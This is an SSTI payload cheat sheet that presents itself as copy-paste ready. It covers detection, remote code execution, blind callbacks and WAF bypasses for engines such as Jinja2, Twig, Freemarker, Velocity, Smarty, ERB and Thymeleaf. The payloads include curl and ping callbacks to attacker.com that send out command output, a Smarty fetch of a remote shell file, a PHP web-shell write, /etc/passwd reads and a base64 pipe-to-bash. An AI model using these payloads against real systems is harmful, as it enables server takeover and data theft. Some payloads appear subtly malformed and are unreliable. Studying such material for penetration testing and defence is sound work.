# SSTI Payloads

Quick reference by template engine. Copy-paste ready.

---
tags:
  - ssti
  - template-injection
  - rce
  - payloads
---

## Detection (Polyglot)

```
${{<%[%'"}}%\.
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
*{7*7}
@(7*7)
${"z".join("ab")}
```

### Detection Flow

```
${7*7} → 49? → Check EL/Mako/Velocity
{{7*7}} → 49? → Check Jinja2/Twig/Nunjucks
<%= 7*7 %> → 49? → Check ERB/EJS
#{7*7} → 49? → Check Pebble/Thymeleaf
*{7*7} → 49? → Check Thymeleaf
```

---

## Jinja2 (Python)

### Detection

```python
{{7*7}}
{{7*'7'}}
{{config}}
{{config.items()}}
{{self.__class__}}
{{request.application}}
```

### RCE

```python
# Classic
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}

# Popen (find subprocess.Popen index first)
{{''.__class__.__mro__[2].__subclasses__()[X]('id',shell=True,stdout=-1).communicate()}}

# os module via config
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Lipsum
{{lipsum.__globals__.os.popen('id').read()}}

# Cycler
{{cycler.__init__.__globals__.os.popen('id').read()}}

# Joiner
{{joiner.__init__.__globals__.os.popen('id').read()}}

# namespace
{{namespace.__init__.__globals__.os.popen('id').read()}}

# request object
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

# URL for
{{url_for.__globals__.os.popen('id').read()}}

# Get_flashed_messages
{{get_flashed_messages.__globals__.os.popen('id').read()}}

# Finding subprocess index
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("id").read()}}{%endif%}{% endfor %}

# Builtins import
{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('id')['read']()}}
```

### Blind Detection

```python
{{''.__class__.__mro__[2].__subclasses__()[40]('/tmp/pwned','w').write('test')}}
{{config.__class__.__init__.__globals__['os'].popen('sleep 5')}}
{{config.__class__.__init__.__globals__['os'].popen('curl attacker.com/'+$(id|base64)')}}
{{config.__class__.__init__.__globals__['os'].popen('ping -c1 attacker.com')}}
```

### WAF Bypass

```python
# attr filter
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')}}

# Hex encoding
{{''['\x5f\x5fclass\x5f\x5f']}}

# Unicode
{{''['\u005f\u005fclass\u005f\u005f']}}

# String concat
{{''.+attr('__cl'+'ass__')}}

# Dict access
{{''['__class__']}}

# Join filter
{{''|attr(['__','class','__']|join)}}

# Format string
{{''|attr('%c%c%c%c%c%c%c%c%c'|format(95,95,99,108,97,115,115,95,95))}}

# Request args
{{request|attr(request.args.x)}}?x=__class__

# No underscores via request
{{()|attr(request.args.a)|attr(request.args.b)}}?a=__class__&b=__mro__
```

---

## Twig (PHP)

### Detection

```twig
{{7*7}}
{{7*'7'}}
{{dump(app)}}
{{app.request.server.all|join(',')}}
{{_self.env}}
```

### RCE

```twig
# System (Twig 1.x)
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}

# Exec
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# Twig 2.x/3.x (Craft CMS)
{{craft.app.view.evaluateDynamicContent('system("id")')}}

# Passthru
{{['id']|filter('passthru')}}

# System via filter
{{['id']|filter('system')}}

# Map + system
{{['id']|map('system')|join}}

# Reduce
{{[0]|reduce('system','id')}}

# Sort
{{['id',0]|sort('system')|join}}

# Array map
{{['id']|map('passthru')}}
```

### Blind Detection

```twig
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("curl attacker.com")}}
{{['sleep 5']|filter('system')}}
```

### WAF Bypass

```twig
# Block syntax
{%set cmd='id'%}{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter(cmd)}}

# String concat
{{"sy"|cat:"stem"}}

# Without quotes
{{app.request.query.get(cmd)}}?cmd=id
```

---

## Freemarker (Java)

### Detection

```freemarker
${7*7}
<#assign x=7*7>${x}
${.data_model}
${.locale}
${"freemarker.template.utility.Execute"?new()("id")}
```

### RCE

```freemarker
# Classic Execute
${"freemarker.template.utility.Execute"?new()("id")}

# ObjectConstructor
${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder","id").start()}

# JythonRuntime
${"freemarker.template.utility.JythonRuntime"?new()("<script>import os;os.system('id')</script>")}

# Runtime exec
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# Process builder
<#assign pb="freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder",["id"])>
${pb.start().waitFor()}

# Reading files
${"freemarker.template.utility.ObjectConstructor"?new()("java.util.Scanner","freemarker.template.utility.ObjectConstructor"?new()("java.io.File","/etc/passwd")).useDelimiter("\\A").next()}
```

### Blind Detection

```freemarker
${"freemarker.template.utility.Execute"?new()("curl attacker.com")}
${"freemarker.template.utility.Execute"?new()("ping -c1 attacker.com")}
${"freemarker.template.utility.Execute"?new()("sleep 5")}
```

---

## Velocity (Java)

### Detection

```velocity
$class
#set($x=7*7)$x
$class.inspect("java.lang.Runtime")
```

### RCE

```velocity
# ClassTool
#set($x=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))

# Without ClassTool
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end

# Reflection
#set($runtime=$class.inspect("java.lang.Runtime").type.getMethod("getRuntime",null).invoke(null,null))
#set($process=$runtime.exec("id"))

# Alternative
#set($e="")$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")
```

### Blind Detection

```velocity
#set($x=$class.inspect("java.lang.Runtime").type.getRuntime().exec("ping -c1 attacker.com"))
#set($x=$class.inspect("java.lang.Runtime").type.getRuntime().exec("curl attacker.com"))
```

---

## Smarty (PHP)

### Detection

```smarty
{$smarty.version}
{php}echo 'test';{/php}
{math equation="7*7"}
{self::getStreamVariable("file:///etc/passwd")}
```

### RCE

```smarty
# PHP tags (Smarty < 3)
{php}system('id');{/php}

# Smarty 3 (before sandbox)
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}

# If tags
{if system('id')}{/if}

# Via literal
{literal}<script language="php">system('id');</script>{/literal}

# System function
{system('id')}

# Passthru
{passthru('id')}

# Fetch
{fetch file="http://attacker.com/shell.txt"}
```

### Blind Detection

```smarty
{system('curl attacker.com')}
{system('ping -c1 attacker.com')}
```

---

## Mako (Python)

### Detection

```python
${7*7}
${self.module.__file__}
<%page expression_filter="h"/>
```

### RCE

```python
# Os module
<%import os;x=os.popen('id').read()%>${x}

# One liner
${self.module.cache.util.os.popen('id').read()}

# Import
<% import os %>${os.popen('id').read()}

# Subprocess
<% import subprocess %>${subprocess.check_output('id',shell=True)}

# Without import
${self.module.runtime.util.os.system('id')}
```

### Blind Detection

```python
${self.module.cache.util.os.popen('curl attacker.com').read()}
${self.module.cache.util.os.popen('sleep 5').read()}
```

---

## ERB (Ruby)

### Detection

```erb
<%= 7*7 %>
<%= self %>
<%= File.open('/etc/passwd').read %>
```

### RCE

```erb
# Backticks
<%= `id` %>

# System
<%= system('id') %>

# Exec
<%= exec('id') %>

# Open pipe
<%= IO.popen('id').readlines() %>

# Spawn
<%= spawn('id') %>

# Open3
<%= require 'open3'; Open3.capture2('id')[0] %>

# %x
<%= %x(id) %>
```

### Blind Detection

```erb
<%= system('curl attacker.com') %>
<%= `ping -c1 attacker.com` %>
<%= `sleep 5` %>
```

---

## Pebble (Java)

### Detection

```pebble
{{7*7}}
{{"test".toUpperCase()}}
{{ beans }}
```

### RCE

```pebble
# Runtime
{% set cmd = 'id' %}
{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}
{{ (1).TYPE.forName('java.lang.String').constructors[0].newInstance(bytes) }}

# ProcessBuilder
{% set pb = (1).TYPE.forName('java.lang.ProcessBuilder').constructors[0].newInstance([['id']]) %}
{% set is = pb.start().inputStream %}
{% set bytes = is.readAllBytes() %}
{{ (1).TYPE.forName('java.lang.String').constructors[0].newInstance(bytes) }}

# One liner
{{''.class.forName('java.lang.Runtime').getRuntime().exec('id')}}
```

---

## Thymeleaf (Java)

### Detection

```thymeleaf
${7*7}
${T(java.lang.Runtime)}
[[${7*7}]]
[(${7*7})]
*{T(java.lang.System).getenv()}
```

### RCE

```thymeleaf
# Expression
${T(java.lang.Runtime).getRuntime().exec('id')}

# Pre-processing
__${T(java.lang.Runtime).getRuntime().exec("id")}__::.x

# URL parameter injection
/path?lang=__$%7BT(java.lang.Runtime).getRuntime().exec(%22id%22)%7D__::.x

# SpEL
${#rt = @java.lang.Runtime@getRuntime(),#rt.exec('id')}

# With output
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}

# ProcessBuilder
${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).useDelimiter('\\A').next()}
```

### Blind Detection

```thymeleaf
${T(java.lang.Runtime).getRuntime().exec('curl attacker.com')}
${T(java.lang.Runtime).getRuntime().exec('ping -c1 attacker.com')}
```

---

## EL (Expression Language - Java)

### Detection

```java
${7*7}
${applicationScope}
${sessionScope}
${pageContext}
```

### RCE

```java
# Runtime
${Runtime.getRuntime().exec("id")}

# Empty array
${Runtime.getRuntime().exec(param.cmd)}?cmd=id

# ProcessBuilder
${pageContext.request.getSession().getServletContext().getClassLoader().getResource("")}

# JSP Shell
${pageContext.getSession().getServletContext().getClassLoader().loadClass("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")}

# With reflection
${"".getClass().forName("java.lang.Runtime").getMethods()[6].invoke("".getClass().forName("java.lang.Runtime")).exec("id")}
```

---

## Generic WAF Bypasses

### Unicode/Hex

```
# Hex
\x5f\x5f = __
\x2e = .

# Unicode
\u005f = _
\u002e = .

# Octal
\137 = _
```

### Whitespace Alternatives

```
# Tab
{%09set%09x=7%09%}

# Newline
{%0aset%0ax=7%0a%}

# Comments
{{7*/**/7}}
```

### String Obfuscation

```python
# Jinja2 string concat
{{"__"|"class"|"__"|join}}

# Reverse
{{"__ssalc__"[::-1]}}

# Base64 in runtime
{{''.__class__.__mro__[2].__subclasses__()[X]('echo aWQ=|base64 -d|bash',shell=True,stdout=-1).communicate()}}
```

### Character Building

```python
# From chr
{{''.__class__.__mro__[2].__subclasses__()[X].__init__.__globals__.__builtins__.chr(95)}}

# Lipsum ASCII
{{lipsum|string|list|attr(25)}}
```

---

## Common Vulnerable Patterns

### Python/Flask

```python
# Render string from user input
render_template_string(request.args.get('name'))

# Format string templates  
template = "Hello %s" % user_input
template = f"Hello {user_input}"
template = "Hello {}".format(user_input)
```

### PHP/Twig

```php
// User input in template
$twig->render("Hello " . $_GET['name']);

// Loading user template
$twig->render($_GET['template']);
```

### Java/Freemarker

```java
// String template with user input
template.process(dataModel, out);  // dataModel contains user input directly
```

### Ruby/ERB

```ruby
# Render user input
ERB.new(params[:template]).result

# Interpolation
"Hello #{params[:name]}"
```

---

## Blind SSTI Detection Techniques

### Time-Based

```python
# Jinja2
{{config.__class__.__init__.__globals__['os'].popen('sleep 5').read()}}

# Twig
{{['sleep 5']|filter('system')}}

# Freemarker
${"freemarker.template.utility.Execute"?new()("sleep 5")}
```

### DNS/HTTP Callback

```python
# Jinja2
{{config.__class__.__init__.__globals__['os'].popen('curl http://BURP_COLLAB').read()}}
{{config.__class__.__init__.__globals__['os'].popen('nslookup BURP_COLLAB').read()}}
{{config.__class__.__init__.__globals__['os'].popen('wget http://BURP_COLLAB').read()}}

# Twig
{{['curl http://BURP_COLLAB']|filter('system')}}

# Freemarker
${"freemarker.template.utility.Execute"?new()("curl http://BURP_COLLAB")}
```

### File Creation

```python
# Jinja2
{{''.__class__.__mro__[2].__subclasses__()[40]('/tmp/pwned','w').write('test')}}

# Mako
<% import os; os.system('touch /tmp/pwned') %>
```

---

## Template Engine Fingerprinting

| Payload | Jinja2 | Twig | Freemarker | Velocity | ERB |
|---------|--------|------|------------|----------|-----|
| `{{7*7}}` | 49 | 49 | Error | Error | Error |
| `${7*7}` | ${7*7} | ${7*7} | 49 | 49 | ${7*7} |
| `<%= 7*7 %>` | Error | Error | Error | Error | 49 |
| `{{7*'7'}}` | 7777777 | 49 | Error | Error | Error |
| `#{7*7}` | Error | Error | Error | Error | 49 |

---

!!! tip "Context Matters"
    Identify the backend language first (Python/PHP/Java/Ruby), then narrow down the template engine.

---
*See also: [XSS](xss.md) for client-side injection, [Command Injection](cmdi.md) for direct OS execution.*
